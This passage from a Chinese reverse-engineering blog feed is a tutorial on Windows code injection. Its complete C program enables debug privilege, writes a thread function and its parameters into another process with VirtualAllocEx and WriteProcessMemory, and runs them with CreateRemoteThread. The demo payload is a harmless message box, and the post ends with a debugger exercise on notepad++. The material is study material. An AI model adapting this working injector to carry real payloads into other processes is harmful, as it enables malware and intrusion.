href="#定义线程信息块">¶</a>定义线程信息块</h2><p>使用结构体存储我们要调用的函数信息</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建一个存储线程信息的结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">THREAD_PARAM</span>//定义线程信息</span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    FARPROC pFunc[<span class="number">2</span>];               <span class="comment">// LoadLibraryA(), GetProcAddress()  </span></span><br><span class="line">    <span class="keyword">char</span>    szBuf[<span class="number">4</span>][<span class="number">128</span>];          <span class="comment">// "user32.dll", "MessageBoxA", "Inject Success!!", "Hint"  </span></span><br><span class="line">} THREAD_PARAM, * PTHREAD_PARAM;<span class="comment">//分别是线程信息块和指向线程信息的指针</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="线程信息块赋值"><a class="header-anchor" href="#线程信息块赋值">¶</a>线程信息块赋值</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hMod = GetModuleHandleA(<span class="string">"kernel32.dll"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//先给线程信息块赋值 </span></span><br><span class="line">param.pFunc[<span class="number">0</span>] = GetProcAddress(hMod, <span class="string">"LoadLibraryA"</span>);</span><br><span class="line">param.pFunc[<span class="number">1</span>] = GetProcAddress(hMod, <span class="string">"GetProcAddress"</span>);<span class="comment">//因为kernel32在内存中优先被装载，所以在不同进程中都一样</span></span><br><span class="line">strcpy_s(param.szBuf[<span class="number">0</span>], <span class="string">"user32.dll"</span>);</span><br><span class="line">strcpy_s(param.szBuf[<span class="number">1</span>], <span class="string">"MessageBoxA"</span>);</span><br><span class="line">strcpy_s(param.szBuf[<span class="number">2</span>], <span class="string">"InjectCode Success!!"</span>);</span><br><span class="line">strcpy_s(param.szBuf[<span class="number">3</span>], <span class="string">"Hint"</span>);</span><br></pre></td></tr></tbody></table></figure><h2 id="打开目标进程"><a class="header-anchor" href="#打开目标进程">¶</a>打开目标进程</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//开启进程  </span></span><br><span class="line">    <span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwPID)))              </span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"OpenProcess() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h2 id="开辟内存并写入线程信息"><a class="header-anchor" href="#开辟内存并写入线程信息">¶</a>开辟内存并写入线程信息</h2><p>第一次写入的是线程函数要调用的函数信息</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//为注入的线程信息块中的第一个函数开辟内存 </span></span><br><span class="line">    dwSize = <span class="keyword">sizeof</span>(THREAD_PARAM);</span><br><span class="line">    <span class="keyword">if</span> (!(pRemoteBuf[<span class="number">0</span>] = VirtualAllocEx(hProcess,<span class="literal">NULL</span>,dwSize,MEM_COMMIT,PAGE_READWRITE)))    </span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"VirtualAllocEx() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//写入线程信息块中函数的值和参数到进程中</span></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess,pRemoteBuf[<span class="number">0</span>],(LPVOID)&amp;param,dwSize,<span class="literal">NULL</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"WriteProcessMemory() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>第二次将线程函数写入内存</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//再次开辟  </span></span><br><span class="line">    dwSize = (DWORD)InjectCode - (DWORD)ThreadProc;</span><br><span class="line">    <span class="keyword">if</span> (!(pRemoteBuf[<span class="number">1</span>] = VirtualAllocEx(hProcess,<span class="literal">NULL</span>,dwSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE)))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"VirtualAllocEx() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//函数调用</span></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess,pRemoteBuf[<span class="number">1</span>],(LPVOID)ThreadProc,dwSize,<span class="literal">NULL</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"WriteProcessMemory() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h2 id="开启远程线程"><a class="header-anchor" href="#开启远程线程">¶</a>开启远程线程</h2><p>在目标线程中开启远程线程</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(hThread = CreateRemoteThread(hProcess,<span class="literal">NULL</span>,<span class="number">0</span>,(LPTHREAD_START_ROUTINE)pRemoteBuf[<span class="number">1</span>],pRemoteBuf[<span class="number">0</span>],<span class="number">0</span>,<span class="literal">NULL</span>)))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"CreateRemoteThread() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h2 id="线程函数实现调用"><a class="header-anchor" href="#线程函数实现调用">¶</a>线程函数实现调用</h2><p>开启线程后会调用线程函数，把我们写入进程内存中的信息读取到要调用的函数中，最后实现调用</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里的WINAPI是调用约定，相当于__stdcall</span></span><br><span class="line"><span class="comment">//线程函数，线程开始的地方</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lParam)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    PTHREAD_PARAM   pParam = (PTHREAD_PARAM)lParam;</span><br><span class="line">    HMODULE         hMod = <span class="literal">NULL</span>;</span><br><span class="line">    FARPROC         pFunc = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LoadLibrary()，将pFunc[0]强制转换为这样类型的函数指针，pParam-&gt;szBuf[0]是该函数的参数</span></span><br><span class="line">    hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[<span class="number">0</span>])(pParam-&gt;szBuf[<span class="number">0</span>]);    <span class="comment">// "user32.dll"，第二个括号内的是函数的参数</span></span><br><span class="line">    <span class="keyword">if</span> (!hMod)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// GetProcAddress()，返回值是回调函数，pFunc就是函数指针</span></span><br><span class="line">    pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[<span class="number">1</span>])(hMod, pParam-&gt;szBuf[<span class="number">1</span>]);  <span class="comment">// "MessageBoxA" ，获取到MessageBoxA的地址 </span></span><br><span class="line">    <span class="keyword">if</span> (!pFunc)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// MessageBoxA()  </span></span><br><span class="line">    ((PFMESSAGEBOXA)pFunc)(<span class="literal">NULL</span>, pParam-&gt;szBuf[<span class="number">2</span>], pParam-&gt;szBuf[<span class="number">3</span>], MB_OK);<span class="comment">//最后的调用</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="0x02-代码实现-v2"><a class="header-anchor" href="#0x02-代码实现-v2">¶</a>0x02-代码实现</h1><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个存储线程信息的结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">THREAD_PARAM</span>//定义线程信息</span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    FARPROC pFunc[<span class="number">2</span>];               <span class="comment">// LoadLibraryA(), GetProcAddress()  </span></span><br><span class="line">    <span class="keyword">char</span>    szBuf[<span class="number">4</span>][<span class="number">128</span>];          <span class="comment">// "user32.dll", "MessageBoxA", "www.reversecore.com", "ReverseCore"  </span></span><br><span class="line">} THREAD_PARAM, * PTHREAD_PARAM;<span class="comment">//分别是线程信息块和指向线程信息的指针</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义函数指针，方便调用HOMDULE是返回值，WINAPI也就是__stdcall，是调用约定，类型名为PFLOADLIBRARYA，lpLivFileName是参数</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span><span class="params">(WINAPI *PFLOADLIBRARYA)</span><span class="params">(LPCSTR lpLibFileName)</span></span>;<span class="comment">//前面的是返回值，中间是类型</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI *PFGETPROCADDRESS)</span><span class="params">(HMODULE hModule,LPCSTR lpProcName)</span></span>;<span class="comment">//返回值是一个回调函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI *PFMESSAGEBOXA)</span><span class="params">(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里的WINAPI是调用约定，相当于__stdcall</span></span><br><span class="line"><span class="comment">//线程函数，线程开始的地方</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lParam)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    PTHREAD_PARAM   pParam = (PTHREAD_PARAM)lParam;</span><br><span class="line">    HMODULE         hMod = <span class="literal">NULL</span>;</span><br><span class="line">    FARPROC         pFunc = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LoadLibrary()，将pFunc[0]强制转换为这样类型的函数指针，pParam-&gt;szBuf[0]是该函数的参数</span></span><br><span class="line">    hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[<span class="number">0</span>])(pParam-&gt;szBuf[<span class="number">0</span>]);    <span class="comment">// "user32.dll"，第二个括号内的是函数的参数</span></span><br><span class="line">    <span class="keyword">if</span> (!hMod)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// GetProcAddress()，返回值是回调函数，pFunc就是函数指针</span></span><br><span class="line">    pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[<span class="number">1</span>])(hMod, pParam-&gt;szBuf[<span class="number">1</span>]);  <span class="comment">// "MessageBoxA" ，获取到MessageBoxA的地址 </span></span><br><span class="line">    <span class="keyword">if</span> (!pFunc)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// MessageBoxA()  </span></span><br><span class="line">    ((PFMESSAGEBOXA)pFunc)(<span class="literal">NULL</span>, pParam-&gt;szBuf[<span class="number">2</span>], pParam-&gt;szBuf[<span class="number">3</span>], MB_OK);<span class="comment">//最后的调用</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InjectCode</span><span class="params">(DWORD dwPID)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    HMODULE         hMod = <span class="literal">NULL</span>;</span><br><span class="line">    THREAD_PARAM    param = { <span class="number">0</span>, };</span><br><span class="line">    HANDLE          hProcess = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE          hThread = <span class="literal">NULL</span>;</span><br><span class="line">    LPVOID          pRemoteBuf[<span class="number">2</span>] = { <span class="number">0</span>, };</span><br><span class="line">    DWORD           dwSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    hMod = GetModuleHandleA(<span class="string">"kernel32.dll"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//先给线程信息块赋值 </span></span><br><span class="line">    param.pFunc[<span class="number">0</span>] = GetProcAddress(hMod, <span class="string">"LoadLibraryA"</span>);</span><br><span class="line">    param.pFunc[<span class="number">1</span>] = GetProcAddress(hMod, <span class="string">"GetProcAddress"</span>);<span class="comment">//因为kernel32在内存中优先被装载，所以在不同进程中都一样</span></span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">0</span>], <span class="string">"user32.dll"</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">1</span>], <span class="string">"MessageBoxA"</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">2</span>], <span class="string">"InjectCode Success!!"</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">3</span>], <span class="string">"Hint"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//开启进程  </span></span><br><span class="line">    <span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwPID)))              </span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"OpenProcess() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//为注入的线程信息块中的第一个函数开辟内存 </span></span><br><span class="line">    dwSize = <span class="keyword">sizeof</span>(THREAD_PARAM);</span><br><span class="line">    <span class="keyword">if</span> (!(pRemoteBuf[<span class="number">0</span>] = VirtualAllocEx(hProcess,<span class="literal">NULL</span>,dwSize,MEM_COMMIT,PAGE_READWRITE)))    </span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"VirtualAllocEx() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//写入线程信息块中函数的值和参数到进程中</span></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess,pRemoteBuf[<span class="number">0</span>],(LPVOID)&amp;param,dwSize,<span class="literal">NULL</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"WriteProcessMemory() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//再次开辟  </span></span><br><span class="line">    dwSize = (DWORD)InjectCode - (DWORD)ThreadProc;</span><br><span class="line">    <span class="keyword">if</span> (!(pRemoteBuf[<span class="number">1</span>] = VirtualAllocEx(hProcess,<span class="literal">NULL</span>,dwSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE)))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"VirtualAllocEx() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//函数调用</span></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess,pRemoteBuf[<span class="number">1</span>],(LPVOID)ThreadProc,dwSize,<span class="literal">NULL</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"WriteProcessMemory() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//开启远程线程，LPTHREAD_START_ROUTINE指向一个回调函数，pRemoteBuf[1]是函数，pRemoteBufe[0]是函数的值和参数</span></span><br><span class="line">    <span class="keyword">if</span> (!(hThread = CreateRemoteThread(hProcess,<span class="literal">NULL</span>,<span class="number">0</span>,(LPTHREAD_START_ROUTINE)pRemoteBuf[<span class="number">1</span>],pRemoteBuf[<span class="number">0</span>],<span class="number">0</span>,<span class="literal">NULL</span>)))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"CreateRemoteThread() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID luid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(),</span><br><span class="line">        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,</span><br><span class="line">        &amp;hToken))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"OpenProcessToken error: %u\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>,           <span class="comment">// lookup privilege on local system  </span></span><br><span class="line">        lpszPrivilege,  <span class="comment">// privilege to lookup   </span></span><br><span class="line">        &amp;luid))        <span class="comment">// receives LUID of privilege  </span></span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"LookupPrivilegeValue error: %u\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span> (bEnablePrivilege)</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable the privilege or disable all privileges.  </span></span><br><span class="line">    <span class="keyword">if</span> (!AdjustTokenPrivileges(hToken,</span><br><span class="line">        FALSE,</span><br><span class="line">        &amp;tp,</span><br><span class="line">        <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES),</span><br><span class="line">        (PTOKEN_PRIVILEGES)<span class="literal">NULL</span>,</span><br><span class="line">        (PDWORD)<span class="literal">NULL</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"AdjustTokenPrivileges error: %u\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (GetLastError() == ERROR_NOT_ALL_ASSIGNED)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"The token does not have the specified privilege. \n"</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    DWORD dwPID = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n USAGE  : %s &lt;pid&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//进程提权</span></span><br><span class="line">    <span class="keyword">if</span> (!SetPrivilege(SE_DEBUG_NAME, TRUE))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//code injection  </span></span><br><span class="line">    dwPID = (DWORD)atol(argv[<span class="number">1</span>]);</span><br><span class="line">    dwPID = <span class="number">9432</span>;</span><br><span class="line">    InjectCode(dwPID);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="0x03-最终效果"><a class="header-anchor" href="#0x03-最终效果">¶</a>0x03-最终效果</h1><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649916449939.png" alt=""></p><h1 id="0x04-代码注入调试练习"><a class="header-anchor" href="#0x04-代码注入调试练习">¶</a>0x04-代码注入调试练习</h1><p>先使用OD打开notepad++，并F9直至notepad++处于运行状态</p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649922555004.png" alt="进行设置"></p><p>然后查看notepad++ PID并注入</p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649922580481.png" alt=""></p><p>注入之后会断在ThreadProc函数</p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649922621425.png" alt=""></p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649922671867.png" alt=""></p><p>在x32中</p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649923028194.png" alt=""></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;代码注入&lt;/p&gt;</summary>
    
    
    
    
    <category term="Windows" scheme="https://gift1a.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>基础知识补充</title>
    <link href="https://gift1a.github.io/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/"/>
    <id>https://gift1a.github.io/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/</id>
    <published>2022-04-11T07:59:14.000Z</published>
    <updated>2022-04-23T00:43:54.345Z</updated>
    
